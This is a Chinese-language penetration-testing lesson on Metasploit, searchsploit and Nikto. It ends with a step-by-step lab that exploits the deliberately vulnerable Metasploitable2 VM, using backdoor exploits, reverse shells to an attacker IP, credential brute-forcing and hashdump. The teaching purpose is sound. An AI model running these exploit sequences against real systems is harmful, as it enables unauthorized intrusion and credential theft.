@@ -1,0 +1,457 @@
+================================================================================
+模块04: 漏洞评估与利用基础
+================================================================================
+
+【学习目标】
+1. 掌握Metasploit框架(msfconsole)的完整操作流程
+2. 学会使用searchsploit搜索和查看Exploit-DB漏洞库
+3. 能使用Nikto进行Web服务器漏洞扫描
+4. 理解漏洞利用的基本概念: exploit, payload, meterpreter
+5. 能对Metasploitable2完成漏洞利用并获得Shell
+
+【所需工具】(archstrike-base已预装)
+- metasploit (msfconsole)
+- searchsploit (exploitdb)
+- nikto
+- Metasploitable2 虚拟机 (目标)
+
+================================================================================
+第一部分: Metasploit框架 (msfconsole) 完整教程
+================================================================================
+
+1.1 Metasploit架构概述
+--------------------------------------------------
+
+核心组件:
+  - Exploit:     漏洞利用代码, 攻击特定漏洞获取访问权限
+  - Payload:     漏洞利用成功后在目标执行的代码
+  - Encoder:     编码/混淆payload以绕过杀软
+  - Post:        后渗透模块 (提权, 信息收集, 持久化等)
+  - Auxiliary:   辅助模块 (扫描, 嗅探, DoS等)
+
+常用Payload类型:
+  - Reverse shell:     目标回连攻击机 (最常见)
+  - Bind shell:        目标开放端口等待攻击机连接
+  - Meterpreter:       Metasploit的高级payload, 功能最丰富
+  - Shell:             简单的命令Shell
+
+1.2 MSFConsole 启动与界面
+--------------------------------------------------
+
+启动:
+  msfconsole              # 启动 (首次启动较慢, 需初始化数据库)
+  msfconsole -q           # 安静模式启动 (跳过banner)
+  msfconsole -r script.rc # 加载资源脚本
+
+初始化数据库:
+  msfdb init              # 初始化PostgreSQL数据库 (首次使用)
+  msfdb start             # 启动数据库
+  (在msfconsole中) db_status  # 检查数据库状态
+
+1.3 核心操作命令
+--------------------------------------------------
+
+搜索模块:
+  search ms17-010                        # 按关键词搜索
+  search type:exploit platform:windows   # 按类型和平台搜索
+  search cve:2017-0144                   # 按CVE编号搜索
+  search name:eternalblue                # 按名称搜索
+  search type:auxiliary scanner smb      # 搜索辅助扫描模块
+
+选择和使用模块:
+  use exploit/windows/smb/ms17_010_eternalblue  # 使用指定模块
+  use auxiliary/scanner/smb/smb_ms17_010       # 使用辅助模块
+
+查看模块信息:
+  info                          # 查看当前模块详细信息
+  show options                  # 查看当前模块的参数
+  show targets                  # 查看支持的目��系统
+  show payloads                 # 查看适用的payload
+  show advanced                 # 查看高级参数
+  show missing                  # 查看未设置的必填参数
+
+设置参数:
+  set RHOSTS 192.168.1.100     # 设置远程目标IP
+  set RHOST 192.168.1.100      # 单目标用RHOST
+  set LHOST 10.0.0.1           # 设置本地监听IP
+  set LPORT 4444               # 设置本地监听端口
+  set RPORT 445                # 设置远程端口
+  set USERNAME admin           # 设置用户名
+  set PASSWORD password123     # 设置密码
+  set TARGETURI /              # 设置目标URI路径
+  set THREADS 10               # 设置线程数
+  set VERBOSE true             # 启用详细输出
+
+全局变量:
+  setg RHOSTS 192.168.1.100    # 设置全局变量 (跨模块有效)
+  setg LHOST 10.0.0.1
+  unsetg RHOSTS                # 取消全局变量
+
+1.4 Payload 管理
+--------------------------------------------------
+
+选择Payload:
+  show payloads                       # 查看所有可用payload
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp   # 设置payload
+  show options                        # 重新查看参数 (payload可能有新参数)
+
+常用Payload:
+  windows/meterpreter/reverse_tcp           # Windows反向TCP Meterpreter
+  windows/x64/meterpreter/reverse_tcp       # Windows x64反向TCP Meterpreter
+  windows/meterpreter/bind_tcp              # Windows正向TCP Meterpreter
+  linux/x86/meterpreter/reverse_tcp         # Linux反向TCP
+  php/meterpreter/reverse_tcp               # PHP Meterpreter
+  java/meterpreter/reverse_tcp              # Java Meterpreter
+  generic/shell_reverse_tcp                 # 通用反向Shell
+
+1.5 执行利用
+--------------------------------------------------
+
+运行模块:
+  run                   # 运行辅助模块
+  exploit               # 执行exploit (同run)
+  exploit -j            # 作为后台任务运行
+  exploit -z            # 运行后不自动与会话交互
+
+Jobs管理:
+  jobs                  # 列出后台任务
+  jobs -K               # 终止所有后台任务
+  jobs -k <id>          # 终止指定任务
+
+会话管理:
+  sessions -l           # 列出所有活跃会话
+  sessions -i 1         # 进入会话1
+  sessions -u 1         # 将shell会话升级为meterpreter
+  sessions -k 1         # 终止会话1
+  sessions -K           # 终止所有会话
+  (在会话中) background 或 Ctrl+Z  # 将当前会话放入后台
+
+1.6 Meterpreter 核心命令
+--------------------------------------------------
+
+系统信息:
+  sysinfo               # 系统信息 (OS, 架构, 主机名等)
+  getuid                # 查看当前用户
+  getpid                # 查看当前进程ID
+  getprivs              # 查看当前权限
+  ps                    # 列出进程
+  getsystem             # 尝试提权到SYSTEM (Windows)
+  shell                 # 进入系统Shell
+  execute -f cmd.exe -i # 执行命令并交互
+
+文件系统:
+  pwd                   # 当前工作目录
+  ls                    # 列出文件
+  cd dir                # 切换目录
+  cat file.txt          # 查看文件内容
+  download file.txt     # 下载文件到本地
+  upload /local/file    # 上传文件到目标
+  edit file.txt         # 编辑文件
+  rm file.txt           # 删除文件
+  mkdir dir             # 创建目录
+
+网络:
+  ipconfig / ifconfig   # 网络接口信息
+  route                 # 路由表
+  portfwd add -L 0.0.0.0 -l 3388 -p 3389 -r 10.0.0.10  # 端口转发
+
+信息收集:
+  hashdump              # 获取Windows密码hash
+  arp                   # ARP表
+  netstat               # 网络连接
+
+================================================================================
+第二部分: searchsploit 使用
+================================================================================
+
+2.1 工具介绍
+--------------------------------------------------
+searchsploit 是 Exploit-DB 的离线搜索工具, 包含大量已验证的
+exploit代码。在ArchStrike中数据位于 /usr/share/exploitdb/
+
+2.2 基本搜索
+--------------------------------------------------
+
+基础搜索:
+  searchsploit wordpress                    # 搜索WordPress相关漏洞
+  searchsploit smb windows                  # 搜索Windows SMB漏洞
+  searchsploit apache 2.4                   # 搜索Apache 2.4
+  searchsploit php remote code execution    # 精确搜索
+
+高级搜索:
+  searchsploit -t oracle                   # 搜索标题
+  searchsploit -p 42033                    # 显示完整路径
+  searchsploit --cve CVE-2017-0144        # 按CVE搜索
+  searchsploit --exclude="dos" ssh        # 排除DoS
+  searchsploit -w wordpress               # 用浏览器打开Exploit-DB链接
+
+2.3 查看和复制Exploit
+--------------------------------------------------
+
+  # 查看exploit内容
+  searchsploit -x 42033                    # 使用默认编辑器查看
+
+  # 复制到当前目录
+  searchsploit -m 42033                    # 复制(mirror)到当前目录
+  searchsploit -m 42033 -t                 # 使用英文标题作为文件名
+
+  # 导出搜索结果
+  searchsploit -j wordpress > results.json # JSON格式输出
+
+2.4 常用搜索模式
+--------------------------------------------------
+  searchsploit "remote" "linux" "kernel"     # Linux内核提权
+  searchsploit "local" "windows" "privilege" # Windows本地提权
+  searchsploit "ftp" "remote"               # FTP远程漏洞
+  searchsploit "web" "xss"                  # XSS漏洞
+  searchsploit "sqli" "wordpress"           # SQL注入
+
+================================================================================
+第三部分: Nikto Web漏洞扫描
+================================================================================
+
+3.1 工具介绍
+--------------------------------------------------
+Nikto是一个开源Web服务器扫描器, 检测:
+  - 危险文件和CGI
+  - 过时/有漏洞的软件版本
+  - 服务器配置问题 (如目录列表)
+  - 默认文件和程序
+  - 不安全的HTTP方法
+
+3.2 基本扫描
+--------------------------------------------------
+
+  # 基本扫描
+  nikto -h http://192.168.1.100
+
+  # 指定端口
+  nikto -h http://192.168.1.100 -p 8080
+
+  # HTTPS扫描
+  nikto -h https://192.168.1.100
+
+  # 输出格式
+  nikto -h http://192.168.1.100 -o nikto_report.html -Format html
+  nikto -h http://192.168.1.100 -o nikto_report.txt -Format txt
+  nikto -h http://192.168.1.100 -o nikto_report.csv -Format csv
+
+  # 带认证的扫描
+  nikto -h http://192.168.1.100 -id admin:password
+
+  # 通过代理扫描
+  nikto -h http://192.168.1.100 -useproxy http://127.0.0.1:8080
+
+3.3 高级选项
+--------------------------------------------------
+
+  # 调整扫描速度
+  nikto -h http://target -Tuning 1234567890  # 测试类型选项
+
+  Tuning选项:
+    1 - 有趣文件
+    2 - 配置错误
+    3 - 信息泄露
+    4 - 注入 (XSS/Script)
+    5 - 远程文件检索
+    6 - 拒绝服务
+    7 - 远程文件检索 (特定目录)
+    8 - 命令执行
+    9 - SQL注入
+    0 - Shellshock
+
+  # 排除特定测试
+  nikto -h http://target -Tuning 123457890  # 排除XSS
+
+  # 自定义User-Agent
+  nikto -h http://target -useragent "Mozilla/5.0"
+
+  # 使用Nmap输出作为Nikto输入
+  nmap -p80,443 192.168.1.0/24 -oG - | nikto -h -
+
+================================================================================
+第四部分: 实践练习 - 攻击Metasploitable2
+================================================================================
+
+目标: 使用Metasploit对Metasploitable2进行完整攻击获取Shell
+
+【路线指引 - 攻击Metasploitable2】
+
+=== 阶段一: 环境准备 ===
+
+Step 1: 启动Metasploitable2虚拟机
+  确认靶机已启动 (如模块03确定IP地址)
+
+Step 2: 确认网络连通性
+  在终端输入: ping -c 3 192.168.1.100
+  设置变量: export TARGET=192.168.1.100
+
+Step 3: 启动Metasploit
+  sudo msfdb start             # 启动数据库
+  msfconsole -q                # 启动MSF
+
+=== 阶段二: SMB漏洞扫描 ===
+
+Step 4: 扫描SMB版本
+  在msfconsole中:
+  use auxiliary/scanner/smb/smb_version
+  set RHOSTS $TARGET
+  run
+  记录SMB版本信息 (通常是Unix Samba 3.x)
+
+Step 5: 检查MS17-010 (EternalBlue) 漏洞
+  use auxiliary/scanner/smb/smb_ms17_010
+  set RHOSTS $TARGET
+  run
+  (Metasploitable2的Samba版本可能不适用, 但这是标准练习)
+
+=== 阶段三: 利用VSFTPD后门 (端口21) ===
+
+Step 6: 利用VSFTPD v2.3.4后门漏洞
+  search vsftpd
+  use exploit/unix/ftp/vsftpd_234_backdoor
+  show options
+  set RHOSTS $TARGET
+  set RPORT 21
+  show targets
+  exploit
+  成功后你将获得一个root shell!
+  输入: whoami (应显示root)
+  输入: id
+  输入: hostname
+  输入: cat /etc/passwd | head -5
+  输入: exit (退出shell)
+  输入: sessions -l (查看会话)
+
+=== 阶段四: 利用UnrealIRCd后门 (端口6667) ===
+
+Step 7: 扫描确认IRC端口
+  use auxiliary/scanner/portscan/tcp
+  set RHOSTS $TARGET
+  set PORTS 6667
+  run
+
+Step 8: 利用IRC后门
+  search unrealircd
+  use exploit/unix/irc/unreal_ircd_3281_backdoor
+  set RHOSTS $TARGET
+  set RPORT 6667
+  show payloads
+  set PAYLOAD cmd/unix/reverse
+  set LHOST 192.168.1.50     # 替换为你的攻击机IP
+  set LPORT 4445
+  exploit
+  获得shell后:
+  whoami
+  ps aux
+  ls /home
+
+=== 阶段五: 利用phpMyAdmin (HTTP端口80) ===
+
+Step 9: 在Firefox浏览器中访问phpMyAdmin
+  打开Firefox
+  在地址栏输入: http://192.168.1.100/phpMyAdmin/
+  查看是否可以直接访问或需要登录
+
+Step 10: 使用metasploit爆破phpMyAdmin
+  use auxiliary/scanner/http/phpmyadmin_login
+  set RHOSTS $TARGET
+  set USERNAME root
+  set PASS_FILE /usr/share/wordlists/fasttrack.txt
+  run
+
+=== 阶段六: 利用Java RMI (端口1099) ===
+
+Step 11: 扫描Java RMI
+  use auxiliary/scanner/misc/java_rmi_server
+  set RHOSTS $TARGET
+  run
+
+Step 12: 利用Java RMI漏洞
+  search java_rmi
+  use exploit/multi/misc/java_rmi_server
+  set RHOSTS $TARGET
+  set RPORT 1099
+  set PAYLOAD java/meterpreter/reverse_tcp
+  set LHOST 192.168.1.50
+  set LPORT 4446
+  exploit
+  获得Meterpreter shell后:
+  sysinfo
+  getuid
+  shell
+  (输入一些linux命令)
+  exit
+  background (将会话放入后台)
+
+=== 阶段七: 利用DistCC (端口3632) ===
+
+Step 13: 扫描DistCC
+  nmap -p 3632 --script distcc-cve2004-2687 $TARGET
+
+Step 14: 利用DistCC漏洞
+  search distcc
+  use exploit/unix/misc/distcc_exec
+  set RHOSTS $TARGET
+  set PAYLOAD cmd/unix/reverse
+  set LHOST 192.168.1.50
+  set LPORT 4447
+  exploit
+  获得shell后执行命令确认权限
+
+=== 阶段八: 查看所有会话 ===
+
+Step 15: 管理所有会话
+  sessions -l              # 列出所有会话
+  sessions -i 1            # 进入会话1
+  sysinfo 或 shell
+  background
+  # 重复操作查看不同的会话
+
+=== 阶段九: 使用Nikto综合扫描Web ===
+
+Step 16: 在另一个终端中, 运行Nikto扫描
+  退出或暂停Metasploit (Ctrl+Z 放入后台)
+  新终端输入:
+  nikto -h http://$TARGET -o nikto_scan.html -Format html
+  cat nikto_scan.html | grep -i "vulnerability\|OSVDB\|warning"
+
+Step 17: 在Firefox中查看Nikto报告
+  Firefox打开: file:///root/scan/ms2/nikto_scan.html
+
+=== 阶段十: 撰写实践报告 ===
+
+Step 18: 记录所有成功的利用
+  在终端中创建实践总结:
+  echo "=== Metasploitable2 利用总结 ===" > exploit_summary.txt
+  echo "日期: $(date)" >> exploit_summary.txt
+  echo "" >> exploit_summary.txt
+  echo "成功利用的漏洞:" >> exploit_summary.txt
+  echo "1. VSFTPD v2.3.4 Backdoor (Port 21) - Root Shell" >> exploit_summary.txt
+  echo "2. UnrealIRCd Backdoor (Port 6667) - Root Shell" >> exploit_summary.txt
+  echo "3. Java RMI (Port 1099) - Meterpreter" >> exploit_summary.txt
+  echo "4. DistCC (Port 3632) - Remote Code Execution" >> exploit_summary.txt
+  echo "" >> exploit_summary.txt
+  echo "安全影响:" >> exploit_summary.txt
+  echo "- 多个服务以root权限运行" >> exploit_summary.txt
+  echo "- 多个后门可直接获取完整系统控制权" >> exploit_summary.txt
+  echo "- 修复建议已记录" >> exploit_summary.txt
+
+Step 19: 关闭所有会话并退出
+  sessions -K
+  exit -y       # 退出msfconsole
+
+【注意事项与提示】
+- Metasploitable2仅用于学习, 绝不要部署在公网
+- 攻击过程中注意观察各服务的日志 (/var/log/)
+- 利用成功后, 立即验证实际权限 (whoami, id)
+- VSFTPD后门利用后应立即获得root, 这是最直接的利用方式
+- 如果不确定LHOST, 在终端运行: ip addr show | grep inet
+- Meterpreter比普通shell功能丰富得多, 优先使用
+- 每个利用成功后先执行shell进入系统操作
+- 练习不同payload类型: cmd/unix/reverse, java/meterpreter, 
+  linux/x86/meterpreter等
+- 记录每个利用所需的确切命令, 这对报告和复现很重要
+- 如果不确定某个模块的参数, 使用 show info 查看详细说明
+
+================================================================================
